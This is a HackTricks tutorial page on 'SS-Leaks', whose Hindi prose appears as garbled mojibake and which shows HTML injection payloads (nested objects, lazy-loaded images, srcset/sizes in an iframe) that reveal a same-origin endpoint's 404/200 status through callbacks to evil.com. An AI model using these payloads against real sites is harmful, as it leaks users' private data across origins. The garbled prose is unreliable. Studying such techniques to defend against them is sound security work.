# SS-Leaks

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

рдпрд╣ **dangling markup рдФрд░ XS-Leaks** рдХреЗ рдмреАрдЪ рдХрд╛ **рдорд┐рд╢реНрд░рдг** рд╣реИред рдПрдХ рдУрд░ рдпрд╣ рднреЗрджреНрдпрддрд╛ рдкреЗрдЬ рдореЗрдВ HTML (рд▓реЗрдХрд┐рди JS рдирд╣реАрдВ) **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЗрдЬ рдХреЗ **рд╕рдорд╛рди рдореВрд▓** рдХрд╛ рд╣реИред рджреВрд╕рд░реА рдУрд░ рд╣рдо рд╕реАрдзреЗ рдЙрд╕ рдкреЗрдЬ рдкрд░ **рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ** рдЬрд╣рд╛рдВ рд╣рдо HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **рджреВрд╕рд░реЗ рдкреЗрдЬ** рдкрд░ рдХрд░реЗрдВрдЧреЗред

## Nested Objects

рдпрджрд┐ <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> рдПрдВрдбрдкреЙрдЗрдВрдЯ 404 рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдВрддрд░рд┐рдХ `object` рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ <mark style="color:yellow;">`https://evil.com?callback=a`</mark> рдХреЛ рдХреЙрд▓рдмреИрдХ рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓рддреА рд╣реИ рдХрд┐ рдЦреЛрдЬ рдХреНрд╡реЗрд░реА `a` рдХреЛрдИ рдкрд░рд┐рдгрд╛рдо рдирд╣реАрдВ рд▓рд╛рдИред
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### рд▓реЗрдЬрд╝реА рд▓реЛрдбрд┐рдВрдЧ

CSP рдпрджрд┐ рдмрд╛рд╣рд░реА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░ рджреЗ рддреЛ рдХреНрдпрд╛ рд╣реЛ? рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CSP рдХреЗ рд╕рд╛рде рдлрд┐рд░ рд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ:

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

рд╣рдорд╛рд░рд╛ рдКрдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ `object` рдХреЙрд▓рдмреИрдХ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреА рдЬрдЧрд╣, рд╣рдо [рд▓реЗрдЬрд╝реА рд▓реЛрдбрд┐рдВрдЧ](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ! рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЗрдореЗрдЬ рдХреЗрд╡рд▓ рддрдм рд▓реЛрдб рд╣реЛрдЧреА рдЬрдм рдпрд╣ рджреГрд╢реНрдпрдорд╛рди рд╣реЛрдЧреА рдФрд░ рд╡реНрдпреВрдкреЛрд░реНрдЯ рд╕реЗ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рджреВрд░реА рдкрд░ рд╣реЛрдЧреАред
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдЪрд┐рддреНрд░

рдКрдкрд░ рджреА рдЧрдИ рддрдХрдиреАрдХ рдЙрддреНрдХреГрд╖реНрдЯ рд╣реИ, рдкрд░рдВрддреБ рдпрд╣ рд╣рдорд╛рд░реЗ HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ рдХрд┐ рд╡рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреГрд╢реНрдп рдХреНрд╖реЗрддреНрд░ рдХреЗ рднреАрддрд░ рд╣реЛред

рдпрджрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рд╕реНрдХреНрд░реАрди рдХреЗ рдмрд╛рд╣рд░ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрдХреНрд░реЛрд▓ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреНрдпрд╛ рд╣рдо рдЕрднреА рднреА рдбреЗрдЯрд╛ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ? рдмреЗрд╢рдХ, рд╣рдо рддрддреНрд╡ IDs рдФрд░ [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ URL рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕реНрдХреНрд░реЛрд▓ рдХреЛ рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдмрд╛рддрдЪреАрдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд╣рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХреА рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдирд┐рд░рдВрддрд░ рд▓реАрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рд╣рдо рд╕рдВрдЧреНрд░рд╣реАрдд HTML рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рддрд░реАрдХреЗ рд╕реЗ рд╣рдерд┐рдпрд╛рд░ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдЪрд┐рддреНрд░реЛрдВ рдХрд╛ рдкреНрд░рд╡реЗрд╢ рдХрд░реЗрдВ! рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЪрд┐рддреНрд░реЛрдВ рдХреЗ `srcset` рдФрд░ `sizes` рдЧреБрдгред

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

рдпрд╣рд╛рдБ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдлреА рд╕рд╛рд░реА рдмрд╛рддреЗрдВ рд╣реИрдВред рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЖрдВрддрд░рд┐рдХ iframe рдХреЗрд╡рд▓ рддрдм рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ рдЬрдм рд▓реАрдХреА endpoint 404 рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб рд▓реМрдЯрд╛рддрд╛ рд╣реИред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо рдЕрдм iframe рдХреЗ рднреАрддрд░ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ URLs рд╕реЗ рд╢рд░реНрддреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЫрд╡рд┐ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред `sizes` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS\_media\_queries/Using\_media\_queries) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣ рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╡реНрдпреВрдкреЛрд░реНрдЯ рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрд┐рд╕ URL рд╕реЗ рдЫрд╡рд┐ рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПред

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░рд╛ iframe `width="1000px"` рдХреЗ рд╕рд╛рде рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрддрд╛ рд╣реИ:

1. рдпрджрд┐ рд▓реАрдХреА рдПрдВрдбрдкреЙрдЗрдВрдЯ 404 рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ iframe рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХреА рдЪреМрдбрд╝рд╛рдИ 1000px рд╣реЛрддреА рд╣реИред iframe рдХреЗ рдЕрдВрджрд░ рдХреА рдЗрдореЗрдЬ `(min-width: 1000px)` рдореАрдбрд┐рдпрд╛ рдХреНрд╡реЗрд░реА рд╕реЗ рдореЗрд▓ рдЦрд╛рддреА рд╣реИ рдФрд░ `https://evil.com?callback=0` рд╕реЗ 800px рдХреА рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛрддреА рд╣реИред
2. рдпрджрд┐ рд▓реАрдХреА рдПрдВрдбрдкреЙрдЗрдВрдЯ 200 рд╕реНрдЯреЗрдЯрд╕ рдХреЛрдб рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ iframe _рдирд╣реАрдВ_ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдЗрдореЗрдЬ рдмрдбрд╝реЗ iframe рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд░реЗрдВрдбрд░ рдирд╣реАрдВ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ, рдпрд╣ `(max-width 999px)` рдореАрдбрд┐рдпрд╛ рдХреНрд╡реЗрд░реА рд╕реЗ рдореЗрд▓ рдЦрд╛рддреА рд╣реИ рдФрд░ `https://evil.com?callback=1` рд╕реЗ 480px рдХреА рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛрддреА рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
